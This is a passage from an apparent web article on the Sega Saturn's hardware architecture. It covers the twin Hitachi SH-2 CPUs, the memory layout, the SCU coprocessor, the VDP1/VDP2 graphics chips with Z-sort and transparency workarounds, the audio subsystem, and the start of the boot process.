enabling to move and operate larger amounts of data (32-bit values) without consuming extra cycles.</li><li><strong>16 general-purpose 32-bit registers</strong>, which is double the amount of previous CPUs like the <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#cpu">Motorolla 68000</a>. This is another design decision derived from the RISC guidelines <sup id="bibref:2"><a href="#bib:cpu-patterson" role="doc-biblioref">[2]</a></sup>.</li><li><strong>32-bit address bus</strong>, allowing up to 4 GB of memory to be addressed (<em>farewell <a href="https://www.copetti.org/writings/consoles/nes/#going-beyond-existing-capabilities">mappers</a></em>).</li><li>A <strong>pipelined data path</strong> with <strong>five stages</strong>: The execution of instructions is now divided into five steps or <em>stages</em>. The CPU will queue up to five instructions and each one is allocated in one stage. This allows taking advantage of all the CPU’s resources without idling while also incrementing the number of instructions executed per unit of time.</li><li>A <strong>16-bit multiplication unit</strong>: Performs multiplications with 16-bit integers.</li></ul><p>Furthermore, the SuperH features a new instruction set called <strong>SuperH ISA</strong> which, apart from adopting a RISC design, <strong>all of its instructions are 16-bit wide</strong>. This comes as a surprise since this CPU operates 32-bit words, so you would expect instructions to have the same length. Yet, Hitachi managed to fit its ISA using half the size. Not only does this format reduce the size of programs, but since the CPU fetches instructions in 32-bit batches, <strong>two instructions can be retrieved in one cycle</strong>. Overall, this technique of compressing the instruction set helped tackle a common concern of RISC-based architectures called ‘code density’, where the latter required more instructions (therefore, more memory) to perform the same tasks as non-RISC systems.</p><p>Conversely, other drawbacks of RISC designs are still present in the SuperH, such as <a href="https://www.copetti.org/writings/consoles/playstation/#delay-galore">control hazards</a>. Consequently, programs are required to include <strong>branch delay slots</strong> to avoid calculation errors. To remediate things, the SuperH features <strong>delayed branch instructions</strong> which are branch instructions pre-fitted with a delay slot.</p><h3 id="sega-is-not-satisfied">Sega is not satisfied</h3><p>Nevertheless, all of that didn’t stop Sega from expressing dissatisfaction with the end product. This was mainly due to the small 16-bit multiplier, which was seen as a bottleneck when processing larger amounts of data (a new need for 3D games). Thus, Hitachi synthesised a second revision with an extended multiplier unit and other requirements on Sega’s checklist <sup id="bibref:3"><a href="#bib:cpu-history" role="doc-biblioref">[3]</a></sup>, leading to a new CPU called <strong>SH-2</strong>.</p><figure><a href="https://www.copetti.org/images/consoles/saturn/sh2s.93e7ad76052cc0ac65d530f751c4fede4665f17d15fa22ff6d6586679b058506.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/_huba88a0028b93a412d89cfad4789263a2_175147_addfe0a24317362c6332a2050138e558.webp 500w,
https://www.copetti.org/images/consoles/saturn/_huba88a0028b93a412d89cfad4789263a2_175147_2ff4e5397b9a9daa87d63b89d955091f.webp 800w,
https://www.copetti.org/images/consoles/saturn/_huba88a0028b93a412d89cfad4789263a2_175147_ab4a3695756c252f48271e585bb99235.webp 900w"><img alt="Image" width="900" height="509" src="https://www.copetti.org/images/consoles/saturn/sh2s.93e7ad76052cc0ac65d530f751c4fede4665f17d15fa22ff6d6586679b058506.jpg" loading="lazy"></picture></a><figcaption>The two SH-2 chips found in the Sega Saturn</figcaption></figure><p>Even so, Sega couldn’t stand still after hearing what choice of CPU <a href="https://www.copetti.org/writings/consoles/playstation/#cpu">its</a> <a href="https://www.copetti.org/writings/consoles/nintendo-64/#cpu">competitors</a> went for. So, it asked Hitachi to step up the clock frequency of the SH-2 - an impossible task once the chip is already out for manufacturing. Luckily, Hitachi had another trick up in their sleeve: <strong>multiprocessing</strong>. During the research phase of the SH, the team added minimal circuitry to allow the SH to work with other SHs within the same system at the same time. Upon hearing that, Sega decided on a two-chip configuration for the Sega Saturn. And the rest is history.</p><h3 id="the-final-product">The final product</h3><p>Having explained the origins, let’s take a look at the shipped product.</p><p>This console has not one but <strong>two Hitachi SH-2</strong> CPUs running at <strong>~28.63 MHz each</strong> <sup id="bibref:4"><a href="#bib:cpu-overview" role="doc-biblioref">[4]</a></sup>. While both physically identical, they are placed in a <strong>master-slave state</strong>, where the first one may send commands to the second one. This can achieve some degree of parallelism, albeit both sharing the same external bus <sup id="bibref:5"><a href="#bib:cpu-dualcpu" role="doc-biblioref">[5]</a></sup> (which can lead to congestion).</p><p>Hitachi packaged different variants of the SH-2 and sold them as part of a series called ‘SH7600’. All of them feature <sup id="bibref:6"><a href="#bib:cpu-brief" role="doc-biblioref">[6]</a></sup>:</p><ul><li>The aforementioned <strong>five-stage pipeline</strong> and <strong>SuperH ISA</strong>. The latter has been extended with six additional instructions for specialised branching and arithmetic.</li><li>An upgraded <strong>32-bit multiplication unit</strong>, which now performs multiplication with 32-bit integers.</li><li>A <strong>32-bit external data bus</strong> that is shared across the two CPUs.</li></ul><p>The specific chip selected for this console, the ‘SH7604’, contains the following additions <sup id="bibref:7"><a href="#bib:cpu-prog_manual" role="doc-biblioref">[7]</a></sup>:</p><ul><li><strong>4 KB of cache</strong>: Stores a small number of instructions and data previously fetched from memory to speed up future reads.</li><li>A <strong>32-bit division unit</strong>: Performs division with 32-bit integers.</li><li><strong>Internal DMA controller</strong>: Transfers data from memory without the intervention of the CPU.</li><li>Support for <strong>little endian</strong>, enabling the CPU to understand values encoded in the opposite order. This is useful when external memory is shared with other processors.</li></ul><p>It’s worth pointing out that <strong>having two CPUs doesn’t mean that games will work twice as fast!</strong> In practice, however, this requires very complex programming to efficiently manage CPUs that share the same bus. Thus, efficient use of the cache also plays a critical role in this console.</p><h3 id="a-divided-choice-of-memory">A divided choice of memory</h3><p>The Sega Saturn contains a total of <strong>2 MB of RAM</strong> for general-purpose usage called <strong>Work RAM</strong> (WRAM). Now, these two megs are split between two very different blocks:</p><ul><li>The first one provides <strong>1 MB of SDRAM</strong> and due to its fast access rates, this block is also called ‘WRAM-H’.</li><li>The other block contains the other megabyte, but it’s named ‘WRAM-L’ since it uses <strong>DRAM</strong> instead, resulting in lower rates.</li></ul><h3 id="the-third-processor-and-counting">The third processor (and counting)</h3><p>Surprisingly, it seems that the two SH-2 CPUs weren’t still enough for Sega. So, to accelerate vector processing (at the cost of more complexity), the console houses an additional coprocessor, the <strong>Saturn Control Unit</strong> or ‘SCU’.</p><p>This is a chip comprised of two modules <sup id="bibref:8"><a href="#bib:cpu-scu" role="doc-biblioref">[8]</a></sup>:</p><ul><li><strong>A DMA controller</strong>: Arbitrates access to WRAM across the three main buses without the intervention of the CPUs.</li><li><strong>A DSP</strong>: Used as a fixed-point ‘geometry unit’. Compared to the SH-2, it does matrix/vectors calculations such as 3D transformations and lighting faster. However, it runs at half-speed and its instruction set is more complex. Moreover, it relies on the SH-2’s WRAM to fetch and store data (using the DMA).</li></ul><p>On the bright side, the SCU comes with <strong>32 KB of SRAM</strong> for local use. On the bad side, the SCU can’t access WRAM-L.</p><hr><h2 id="graphics">Graphics</h2><p>Since the Saturn is the first ‘3D console’ reviewed for <a href="https://www.copetti.org/writings/consoles/">this series</a>, let us first go over the fundamental design changes that made way to the new generation of 3D graphics:</p><ul><li>The GPU now relies on a <strong>frame-buffer</strong>: Graphics are no longer required to be rendered on-the-fly. Instead, the GPU reserves a portion of VRAM to draw a bitmap with all the computed geometry requested by the CPU, and then a video encoder picks up that region and outputs it through the video signal.<ul><li>Consequently, having this reserved ‘working space’ allows the GPU to continue manipulating the bitmap even after finishing rendering the scene, so the CPU may now offload some exhaustive tasks such as lighting and anti-aliasing to the GPU. Here is when the term <strong>graphics pipeline</strong> starts to gain momentum.</li></ul></li><li><strong>More VRAM required</strong>: The use of a frame buffer implies an increment of memory requirements (which is not a big issue anymore), the amount of RAM required for a frame buffer is proportional to the dimension of the screen and the number of colours used. As an example, with 600 KB of VRAM we can contain a frame buffer of 640x480 pixels wide with 32k colours per pixel (16 bpp).<ul><li>Additionally, programmers are free to organise their VRAM usage: Not every single bit has to be allocated for the frame buffer, so why don’t we also use it to cache textures, render other frame-buffers concurrently and add colour lookup tables to speed things up?</li></ul></li><li>The CPU incorporates <strong>vector operations</strong>: A GPU with 3D capabilities would be incomplete without a proper CPU capable of feeding the required geometry. For that reason, next-gen CPUs include a form of specialised instructions that accelerates vector calculations, these are known as <strong>Single instruction multiple data</strong> or ‘SIMD’ extension.<ul><li>In the case of the Saturn, vector operations are accelerated by the Saturn Control Unit (not by the SH-2 CPUs).</li></ul></li></ul><h3 id="segas-offering">Sega’s offering</h3><p>This console includes <strong>two proprietary GPUs</strong>, each one serving different purposes while working concurrently. Some may argue that the new GPUs are an evolution of the <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#graphics">classic VDP</a>, while others may say it’s a complete redesign… I think it’s a bit of both.</p><p>Having said that, let’s take a look at the two chips.</p><div><ul><li id="tab-1-1-vdp1-link"><a href="#tab-1-1-vdp1">VDP1</a></li><li id="tab-1-2-vdp2-link"><a href="#tab-1-2-vdp2">VDP2</a></li></ul><div><div id="tab-1-1-vdp1"><h4 id="tab-1-1-vdp1">VDP1</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/vdp/VDP1.fdad1a669a57458ce0a25a18bc77b259452f485cecbc146ad56eff227d371352.png"><picture><img alt="Image" width="570" height="411" src="https://www.copetti.org/images/consoles/saturn/vdp/VDP1.fdad1a669a57458ce0a25a18bc77b259452f485cecbc146ad56eff227d371352.png" loading="lazy"></picture></a><figcaption>VDP1 Architecture.</figcaption></figure><p>The <strong>Video Display Processor 1</strong> (VDP1) is a chip that draws sprites with geometric transformations <sup id="bibref:9"><a href="#bib:graphics-vdp1" role="doc-biblioref">[9]</a></sup>. The results are written onto a frame buffer, which is in turn streamed to the VDP2 for display.</p><p>This chip is programmed by sending ‘drawing commands’ to it. So, programmers are provided with <strong>512 KB of dedicated RAM</strong> to store these drawing commands and the required materials (textures/tiles, colour lookup tables, etc).</p><p>Consequently, the VDP1 is designed to use <strong>quadrilaterals as primitives</strong>, which means that it can only compose models using 4-vertex polygons (sprites). The chip applies <strong>Forward Texture Mapping</strong> to connect texture points onto the quadrilateral, in that direction. It doesn’t come with any filtering/interpolation technique, so the calculations are subject to <strong>aliasing</strong>.</p><p>The VDP1 also provides this selection of effects:</p><ul><li>Two <strong>shading algorithms</strong> (Flat and Gouraud) for lighting.</li><li><strong>Anti-aliasing</strong>: In this case, it duplicates pixels to cover gaps during mapping.</li><li><strong>Clipping</strong> to discard polygons outside the camera’s viewport.</li><li><strong>Transparency</strong> to blend two non-opaque bitmaps.</li></ul><p><strong>Two 256 KB frame buffer chips</strong> are available to concurrently draw new scenes of the game without breaking the current one being displayed. When the secondary buffer is finished being drawn, the VDP1 starts broadcasting the latter instead (<strong>page-flipping</strong>), and the cycle continues.</p></div><div id="tab-1-2-vdp2"><h4 id="tab-1-2-vdp2">VDP2</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/vdp/VDP2.b23bf279fc4d3d3a0f46ed7550fa3463341a71412266f51e1ee99d95d0bf7c52.png"><picture><img alt="Image" width="585" height="504" src="https://www.copetti.org/images/consoles/saturn/vdp/VDP2.b23bf279fc4d3d3a0f46ed7550fa3463341a71412266f51e1ee99d95d0bf7c52.png" loading="lazy"></picture></a><figcaption>VDP2 Architecture.</figcaption></figure><p>The <strong>Video Display Processor 2</strong> (VDP2) specialises in rendering large (4096×4096 pixels) planes with transformations (rotation, scale and translation) applied on them <sup id="bibref:10"><a href="#bib:graphics-vdp2" role="doc-biblioref">[10]</a></sup>.</p><p>More importantly, the VDP2’s renders <strong>on-the-fly</strong> (without a frame-buffer) like previous <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#constructing-the-frame">tile-based engines</a>. It can display up to <strong>16.7 million colours</strong> (24-bit). This chip is also responsible for displaying the VDP1’s buffer, which can also be transformed and/or mixed with the VDP2’s layers. The VDP2’s ‘frame’ is composed of up to four 2D planes and one 3D plane; or two 3D planes.</p><p>This chip relies on <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#constructing-the-frame">tile-maps</a> to compose planes and performs <strong>perspective correction</strong> for 3D texture mapping, this is a more sophisticated approach which takes into account the depth value to compute rotations.</p><p>Effects available include <strong>multi-texturing</strong> (mapping more than one texture per polygon) and <strong>shadowing</strong>. With the latter, after the VDP2 receives the sprites generated by the VDP1, it can reduce their brightness and blend them with half-transparency. Nonetheless, the VDP2 only receives a sprite stream from the VDP1 (in pace with the CRT beam) so this function tends to be tricky to encode and operate.</p><p>This chip also houses <strong>4 KB of Colour RAM (CRAM)</strong> which is used to translate VDP1’s custom colour values (index colours) into 24-bit RGB colours.</p><p>Finally, even though the VDP2 is limited to two 3D planes, nothing prevents the CPU from using its VRAM as frame-buffer area to draw additional 2D or 3D graphics in software.</p><p>I recommend checking out the sources (at the end of the article) if this section got your attention, since the VDPs have a lot more quirks that are beyond the scope of this article.</p></div></div></div><h3 id="defining-the-problem">Defining the problem</h3><p>As you can see, the architecture of the graphics sub-system is quite complex, so it’s interpreted differently depending on the needs:</p><h3 id="as-a-powerful-2d-console">As a powerful 2D console</h3><p>The capabilities of the Saturn for drawing 2D scenes were huge compared to the <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/">Mega Drive</a> or <a href="https://www.copetti.org/writings/consoles/super-nintendo/">SNES</a>, although they weren’t the main selling point of this console.</p><div><ul><li id="tab-2-1-sprites-link"><a href="#tab-2-1-sprites">Sprites</a></li><li id="tab-2-2-backgrounds-link"><a href="#tab-2-2-backgrounds">Backgrounds</a></li><li id="tab-2-3-result-link"><a href="#tab-2-3-result">Result</a></li></ul><div><div id="tab-2-1-sprites"><h4 id="tab-2-1-sprites">Sprites</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/2d/sprites.aed26d0c131764932c5b011cde056cc3c3f2b96383da5eacdfb7cd74890bc5ac.png"><picture><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/sprites.aed26d0c131764932c5b011cde056cc3c3f2b96383da5eacdfb7cd74890bc5ac.png" loading="lazy"></picture></a><figcaption>Mega Man X4 (1997).<br>VDP1’s Sprites plane.</figcaption></figure><p>In this case, the VDP1 is tasked with plotting traditional sprites without any 3D distortion applied.</p><p>The CPU sets up the VDP1 by writing over its registers and filling its VRAM with commands and tiles. The process can also be accelerated thanks to the DMA controller.</p></div><div id="tab-2-2-backgrounds"><h4 id="tab-2-2-backgrounds">Backgrounds</h4><figure><ul><li id="tab-3-1-2d-plane-1-link"><a href="#tab-3-1-2d-plane-1">2D plane 1</a></li><li id="tab-3-2-2d-plane-2-link"><a href="#tab-3-2-2d-plane-2">2D plane 2</a></li><li id="tab-3-3-2d-plane-3-link"><a href="#tab-3-3-2d-plane-3">2D plane 3</a></li></ul><figure id="tab-3-1-2d-plane-1"><a href="https://www.copetti.org/images/consoles/saturn/2d/bg1.806c3496225c21fd9d20c28c26e89258d054652f3a7a3f91498475dc8aa7563d.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu29a58c724f173a0d5fa24f9f7ed2543f_65354_e0baf528b2ce12a099abc6349e62c94b.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu29a58c724f173a0d5fa24f9f7ed2543f_65354_c0ddcb61315017b87fbc1bf5b258f5cc.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/bg1.806c3496225c21fd9d20c28c26e89258d054652f3a7a3f91498475dc8aa7563d.png" loading="lazy"></picture></a><figcaption>2D plane 1.</figcaption></figure><figure id="tab-3-2-2d-plane-2"><a href="https://www.copetti.org/images/consoles/saturn/2d/bg2.d4c8d3f742b50c3a320381de54f55c915f18cfa6b11ffb9c7b89deef8518d734.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu44ce6785b9058ab8bf7d8766d9806a32_177511_08343901bc8cd28b89cf6d6770760c04.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu44ce6785b9058ab8bf7d8766d9806a32_177511_c32ffcf3fd0342e67c444c6f7876ca79.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/bg2.d4c8d3f742b50c3a320381de54f55c915f18cfa6b11ffb9c7b89deef8518d734.png" loading="lazy"></picture></a><figcaption>2D plane 2.</figcaption></figure><figure id="tab-3-3-2d-plane-3"><a href="https://www.copetti.org/images/consoles/saturn/2d/bg3.6e360c2e15e3bd3710e092555e9dbbab1dbc8cad8b077c613a4553294edf2c90.png"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu3a215beb78fc89771688c0eccbfc7e12_88802_45c432f6f66a4974fbac19969b1edb38.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu3a215beb78fc89771688c0eccbfc7e12_88802_fd0d325089a9a53cfc14b998fdfc6007.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/bg3.6e360c2e15e3bd3710e092555e9dbbab1dbc8cad8b077c613a4553294edf2c90.png" loading="lazy"></picture></a><figcaption>2D plane 3.</figcaption></figure><figcaption>Mega Man X4 (1997). VDP2’s Background planes.</figcaption></figure><p>The VDP2 is then instructed to draw background planes. These, along with the sprite layer, are automatically mixed to form a fully coloured scene.</p><p>The commanding part is fundamentally similar to the VDP1: Programmers got registers and VRAM to set up accordingly.</p><p>Some functions from the VDP2 can be exploited to create more realistic scenery, such as scaling to simulate a heatwave (see ‘2D plane 2’).</p></div><div id="tab-2-3-result"><h4 id="tab-2-3-result">Result</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/2d/result.4fc30597f8b95bc2085d22e404b09e8cb52b7004e06da50bfc28290b700ac3e2.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/2d/_hu31050179c0105c57de890a2b789e9556_64327_6f6bfaf1f4809b91e437e17f74e5cb92.webp 500w,
https://www.copetti.org/images/consoles/saturn/2d/_hu31050179c0105c57de890a2b789e9556_64327_6dc514cb6f330ab9918cf439e6237d0c.webp 640w"><img alt="Image" width="640" height="480" src="https://www.copetti.org/images/consoles/saturn/2d/result.4fc30597f8b95bc2085d22e404b09e8cb52b7004e06da50bfc28290b700ac3e2.jpg" loading="lazy"></picture></a><figcaption>Mega Man X4 (1997). Mixed planes (<em>Tada!</em>).</figcaption></figure><p>Not much mystery here, the VDP2 is responsible for the last step of sending the processed signal to the video encoder.</p><p>The VDP2 operates in sync with the CRT beam, meaning that its computations correspond to the pixels that will be displayed on the next scan line.</p></div></div></div><h3 id="as-a-challenging-3d-console">As a challenging 3D console</h3><p>Here’s where the Saturn <em>shined and struggled</em> at the same time. While this console had eight processors to take advantage of, it all came down to:</p><ul><li>Whether programmers would be able to master most of the console’s features during a small time frame (remember the console’s commercial lifespan would be over once its successor is released, or even announced).</li><li>Whether their game would be shipped at a reasonable date.</li></ul><p>For this reason, most games ended up dramatically ranging in quality since each studio came up with a unique solution.</p><div><ul><li id="tab-4-1-3d-modelling-link"><a href="#tab-4-1-3d-modelling">3D modelling</a></li><li id="tab-4-2-pixel-processing-link"><a href="#tab-4-2-pixel-processing">Pixel processing</a></li></ul><div><div id="tab-4-1-3d-modelling"><h4 id="tab-4-1-3d-modelling">3D modelling</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/3d/models.0a95b90d32068033e0fcf8a67199e2dcac6118c22067def8896c5ffb4d439699.png"><picture><img alt="Image" width="697" height="437" src="https://www.copetti.org/images/consoles/saturn/3d/models.0a95b90d32068033e0fcf8a67199e2dcac6118c22067def8896c5ffb4d439699.png" loading="lazy"></picture></a><figcaption>Virtua Fighter Remix (1995).<br>3D models of characters without textures or background. Notice the primitives used to build the models.</figcaption></figure><p>So far we’ve been using individual regular quadrilaterals to form sprites and/or background layers. But what if we group multiple irregular primitives and arrange them to form a more complex figure? This is how 3D models come to fruition.</p><p>To put it in simple terms, classic 2D consoles like the <a href="https://www.copetti.org/writings/consoles/super-nintendo/">Super Nintendo</a> arranges their graphics (backgrounds and sprites) in quasi-rectangular areas. In some cases, such as with <a href="https://www.copetti.org/writings/consoles/super-nintendo/#unique-features">Mode 7</a>, programmers can supply a rotation matrix to apply transformations over some of these areas. The Saturn, by contrast, allows defining 4-point quadrilaterals with arbitrary angles between their edges (Sega calls them ‘distorted sprites’). Then, the VDPs’ texture mapping capabilities paint the quadrilateral’s area with a texture, the latter is scaled to conform to the polygon’s shape.</p><p>In terms of operations needed with a 3D game, the CPUs and SCU are assigned to formulating a 3D world and project it in a 2D space. Then, both VDPs are commanded to render it, apply effects and finally broadcast it on TV.</p></div><div id="tab-4-2-pixel-processing"><h4 id="tab-4-2-pixel-processing">Pixel processing</h4><figure><a href="https://www.copetti.org/images/consoles/saturn/3d/complete.42b6a7e00f11f9e18fb97440ba9fa3510cd3c2943e465d52659e24e4ced689f3.png"><picture><img alt="Image" width="704" height="448" src="https://www.copetti.org/images/consoles/saturn/3d/complete.42b6a7e00f11f9e18fb97440ba9fa3510cd3c2943e465d52659e24e4ced689f3.png" loading="lazy"></picture></a><figcaption>Virtua Fighter Remix (1995).<br>Rendered scene with 3D models and backgrounds.</figcaption></figure><p>Either VDP can draw this new (projected) 3D space and stamp textures and effects. Now, which chip is ‘in charge’ varies between each game.</p><p>Some prioritised the VDP1 to draw the closest polygons and left the VDP2 to process distant scenery, others found interesting workarounds to task the VDP2 to draw closer polygons (thereby off-loading the amount of geometry fed into the VDP1). The challenge consists in designing an efficient engine that could display <em>impressive</em> graphics while keeping an acceptable frame rate.</p></div></div></div><h3 id="the-new-designs">The new designs</h3><p>These are some examples of characters that were re-designed for this console, the models are interactive so do try to fiddle with them!</p><p>While the Saturn is only able to draw quadrangles, you’ll soon notice that these models exhibit two triangles instead of a single quadrangle in ‘Wireframe’ mode. This is because the format used to encode this model (glTF, an open standard for modern 3D modelling), so your modern device can render it, doesn’t support quadrangles at the time of this writing. So, I recommend switching to ‘Surface’ mode to observe the quads.</p><p>In some way, this tells you how the current graphics technology can struggle to reproduce their ~30-year-old predecessors!</p><h3 id="an-introduction-to-the-visibility-problem">An introduction to the visibility problem</h3><p>When 3D polygons are projected onto a 2D space, it is crucial to determine <strong>which polygons are visible from the camera’s position and which are hidden behind</strong> <sup id="bibref:11"><a href="#bib:graphics-vsd" role="doc-biblioref">[11]</a></sup>. Otherwise, models are not drawn correctly, effects like transparency appear ‘broken’ and ultimately, hardware resources are wasted. This process is widely known as <strong>Visible surface determination</strong> or ‘VSD’ and it’s a fundamental problem in the world of computer graphics. There are multiple papers published that describe algorithms that tackle this at different stages of the graphics pipeline. Some of them give very accurate results, while others trade precision for better performance.</p><p>Now, unlike academic/professional equipment, consumer hardware is incredibly limited, so the choice of algorithm is narrowed down to just a few… or none whatsoever.</p><div><figure><a href="https://www.copetti.org/images/consoles/saturn/projectz.f3bbf2215c139f454cb6606d15fca9d439e1935d8bcad2e69ddbc1514dc4ba47.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/_hu6d6d6508d38b1484d215cec630a9cfda_117807_c434c79e7a2e39ef331cbae69baf5b16.webp 500w,
https://www.copetti.org/images/consoles/saturn/_hu6d6d6508d38b1484d215cec630a9cfda_117807_899ba92c9e3f0ad854df28f38e22a7e2.webp 704w"><img alt="Image" width="704" height="448" src="https://www.copetti.org/images/consoles/saturn/projectz.f3bbf2215c139f454cb6606d15fca9d439e1935d8bcad2e69ddbc1514dc4ba47.jpg" loading="lazy"></picture></a><figcaption>Project Z-Treme (2019, Homebrew) <sup id="bibref:12"><a href="#bib:graphics-ztreme" role="doc-biblioref">[12]</a></sup>.<br>This engine ditched Z-sort in favour of a binary space partitioning (BSP) approach, fixing the glitches.</figcaption></figure><p>The Sega Saturn approach is what I consider a ‘semi-solved’ case. The VDP1 doesn’t implement any VSD function: You either feed the geometry in the correct order or you get a mess. However, Sega provided a graphics library called ‘SGL’ that implemented a solution called <strong>Z-sort</strong> or <strong>Painter’s algorithm</strong> <sup id="bibref:13"><a href="#bib:graphics-sgl" role="doc-biblioref">[13]</a></sup> which performs <strong>polygon sorting by software</strong>.</p><p>Essentially, SGL allocates a buffer to sort the polygons based on the distance from the camera (from furthest to nearest), then, issues the display commands to the VDP1 in that order.</p></div><p>One of the issues of Z-sort with 3D spaces is that its distance value (Z-order) is <strong>approximated</strong>, so graphic glitches may still appear. For this, programmers can skip SGL in favour of implementing their own algorithm.</p><p>In later articles, you will see alternative approaches. Some still rely on software, while others are accelerated by hardware.</p><h3 id="the-transparency-issue">The transparency issue</h3><p>The Sega Saturn is capable of drawing <strong>half-transparent graphics</strong>, in other words, mixing overlapping layers of colours (blending) to give the illusion we can see through them. Unfortunately, both VDPs aren’t as coordinated as one would expect, so this effect will not work properly when these layers are found in different VDPs.</p><p>As a workaround, games can activate the ‘mesh’ property on a texture. With ‘meshed’ textures, the VDP1 sets the odd X/Y texture coordinates as ‘transparent’ (empty). Making it possible to blend other layers using the transparent pixels. Curiously enough, the mesh would appear blurred if the console was connected to the TV using the composite video signal (which was pretty much the standard back then, aside from RF) resulting in an accidental but effective way to accomplish half-transparency <sup id="bibref:14"><a href="#bib:graphics-geer" role="doc-biblioref">[14]</a></sup>.</p><p>As you may suspect, this just wasn’t viable for some games, so in the end, these had no option but to ditch half-transparency altogether… Although some studios found ingenious fixes, take a look at these two cases:</p><figure><figure><video poster="https://www.copetti.org/images/consoles/saturn/video_posters/daytona.81b963bc475e2178039efcfbb2fc7e8f15b891473b7a95a856d04a810b97946c.jpg" preload="none" width="640" height="424" src="https://www.copetti.org/videos/consoles/saturn/daytona.2e198ac188497880d3e590e8389d6230e514612581212f9c8d56f973fb498ef9.mp4" controls="" controllist="nodownload">
No support for video.</video><figcaption>Sega’s Daytona (1993).</figcaption></figure><figure><video poster="https://www.copetti.org/images/consoles/saturn/video_posters/sonicr.628de8fed8e7e796ed02de4d932fef12223c3516bd1905077086a70d38ceeb8e.jpg" preload="none" width="640" height="472" src="https://www.copetti.org/videos/consoles/saturn/sonicr.7b727bcecc2d80908338132b32e006aa3858cb837ac3bed3f6da28239d30f4fe.mp4" controls="" controllist="nodownload">
No support for video.</video><figcaption>Traveller’s Tales’ Sonic R (1997).</figcaption></figure><figcaption>Both games command the VDP1 to draw foreground objects and background scenery. In turn, the VDP2 renders the landscape image far away and the stats in front of the 3D models. Consequently, VDP1 models with half-transparency won’t refract the VDP2’s landscape as the VDP1 is not aware of the VDP2’s frame buffers.</figcaption></figure><p>Apart from my terrible gameplay, you’ll notice that the background of the first game pops out of nowhere (no half-transparency) whereas the second game not only accomplished half-transparency but also a <strong>fading effect</strong>: Traveller’s Tales found a workaround by changing the ‘mix ratio’ registers of the VDP2 (used for defining the texture’s alpha) combined with switching the lighting levels as the character gets closer <sup id="bibref:15"><a href="#bib:graphics-burton" role="doc-biblioref">[15]</a></sup>.</p><hr><h2 id="audio">Audio</h2><p>The sound subsystem consists of several parts <sup id="bibref:16"><a href="#bib:audio-scsp" role="doc-biblioref">[16]</a></sup>:</p><ul><li><strong>Motorola 68EC000</strong>: Controls the other components and interfaces with the main CPUs. It runs a <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#the-conductor">sound driver</a> to operate the neighbour components.</li><li><strong>Saturn Custom Sound Processor</strong> (SCSP): Also referred to as Yamaha YMF292, it’s composed of two modules:<ul><li>A <strong>multi-function sound generator</strong>: Processes up to <strong>32 channels</strong> with <strong>PCM samples</strong> (up to 16-bit with 44.1 kHz, a.k.a ‘CD quality’) or <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#audio">FM channels</a>. In the case of the latter, a number of channels are reserved for operators.</li><li>A <strong>DSP</strong>: Applies effects like echo, reverb and chorus. The docs also mention ‘filters’ but I don’t know if it means envelope or frequency filter (i.e.&nbsp;low pass, etc).</li></ul></li><li><strong>512 KB of RAM</strong>: Stores the driver, audio data (i.e.&nbsp;PCM samples) and it’s also a working area for the DSP.</li></ul><h3 id="the-opportunity">The opportunity</h3><p>The new audio capabilities mean that studios can finally record/produce soundtracks in-house and then bundle them in the game without having to re-arrange it (as it happened with limited <a href="https://www.copetti.org/writings/consoles/super-nintendo/#audio">sequencers</a> or chips with strict <a href="https://www.copetti.org/writings/consoles/mega-drive-genesis/#audio">synthesis methods</a>).</p><p>This has been possible thanks to a combination of many factors:</p><ul><li>The new storage medium for games (CD-ROM) enables developers to store large soundtracks.</li><li>The audio endpoint receives and mixes PCM data with acceptable quality.</li><li>The audio subsystem provides enough power and bandwidth to stream PCM data in some compressed form, and then decode it on-the-fly.</li></ul><hr><h2 id="operating-system">Operating System</h2><p>Once the user powers on the console, the first component that starts up is the <strong>System Management &amp; Peripheral Control</strong> (SMPC), a 4-bit microcontroller that takes care of initialising the neighbouring chips (such as switching on two SH-2s and setting them in a ‘master-slave’ configuration) <sup id="bibref:17"><a href="#bib:games-smpc" role="doc-biblioref">[17]</a></sup>.</p><figure><figure><a href="https://www.copetti.org/images/consoles/saturn/ipl/logo_jap.763d14af000051f75cda703fa5241e82b6cd215f5adfae9b29f9d8b38a77e2a3.jpg"><picture><source type="image/webp" srcset="https://www.copetti.org/images/consoles/saturn/ipl/_hu0b5b6c76da3d5b8615c08a00e7e1a69c_75233_6888c01d1b35b093c9a6a3bf463c57cd.webp 500w,
